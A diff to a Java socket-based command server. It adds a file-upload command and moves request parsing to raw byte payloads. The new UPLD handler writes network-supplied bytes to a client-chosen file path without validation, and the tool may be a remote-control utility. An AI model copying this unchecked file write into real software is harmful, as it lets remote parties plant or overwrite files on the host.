@@ -1,10 +1,9 @@
 package server;
 
-import java.io.BufferedReader;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import java.io.OutputStream;
 import java.net.Socket;
 import java.util.HashMap;
 
@@ -183,8 +182,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		// Download a file
 		cmdsServer.put("dwnld", new ClientCommand(this, "DWNLD"));
 		
-		// Retrieve OS
-		cmdsServer.put("os", new ClientCommand(this, "OS"));
+		// Upload a file
+		cmdsServer.put("upld", new ClientCommand(this, "UPLD"));
 		
 		
 		
@@ -235,9 +234,33 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			@Override
 			public String exec(ParsedCommand pCmd) {
 				
-				System.out.println(pCmd);
+				System.out.print('\n');
+				for (int i = 0; i < pCmd.payload.length; i++)
+					System.out.print((char) pCmd.payload[i]);
+				System.out.print(getPrefix() + ">");
+
+				return "DONE";
+			}
+			
+		});
+		
+		cmdsClient.put("UPLD", new Command(){
+
+			@Override
+			public String exec(ParsedCommand pCmd) {
 				
-				return "";
+				try {
+					OutputStream out = new FileOutputStream(pCmd.args[0]);
+					for (int i = 0; i < pCmd.payload.length; i++) {
+						out.write(pCmd.payload[i]);
+					}
+					out.close();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				
+				return "DONE";
 			}
 			
 		});
@@ -249,42 +272,47 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			throws IOException {
 		
 		// Opening in/out streams
-		InputStream inputStream = socket.getInputStream();
-		BufferedReader in = new BufferedReader(
-				new InputStreamReader(inputStream));
-		PrintWriter out = new PrintWriter(socket.getOutputStream());
+		InputStream in = socket.getInputStream();
+		OutputStream out = socket.getOutputStream();
 		
 		// Payload length
-		int payloadLength = Integer.parseInt(in.readLine());
-		StringBuilder payload = new StringBuilder();
+		StringBuilder sb = new StringBuilder();
+		int c;
+		while ((c = in.read()) != 10) {
+			if (c != 10 && c != 13)
+				sb.append((char) c);
+		}
+		int payloadLength = Integer.parseInt(sb.toString());
+		byte[] payload = new byte[payloadLength];
 		
 		// Reading request
-		String request = in.readLine();
+		sb = new StringBuilder();
+		while ((c = in.read()) != 10) {
+			if (c != 10 && c != 13)
+				sb.append((char) c);
+		}
+		String request = sb.toString();
 		
-		if (payloadLength > 0) {
-			String line;
-			while ((line = in.readLine()) != "") {
-				System.out.println(line);
-				payload.append(line);
-			}
+		// Reading payload
+		for (int i = 0; i < payloadLength; i++) {
+			payload[i] = (byte) in.read();
 		}
 		
 		// Logging request
 		log.add(0, socket.getInetAddress() + "\t" + request);
 		
 		// Executing command
-		ParsedCommand pCmd = new ParsedCommand(request, payload.toString());
+		ParsedCommand pCmd = new ParsedCommand(request, payload);
 		if (cmdsClient.containsKey(pCmd.cmd)) {
 			String response = cmdsClient.get(pCmd.cmd).exec(pCmd);
 			log.add(1, socket.getInetAddress() + "\t" + response);
-			out.println(response);
+			out.write(response.getBytes());
 			out.flush();
 		}
 		
 		// Closing all streams
-		in.close();
 		out.close();
-		inputStream.close();
+		in.close();
 
 	}
 
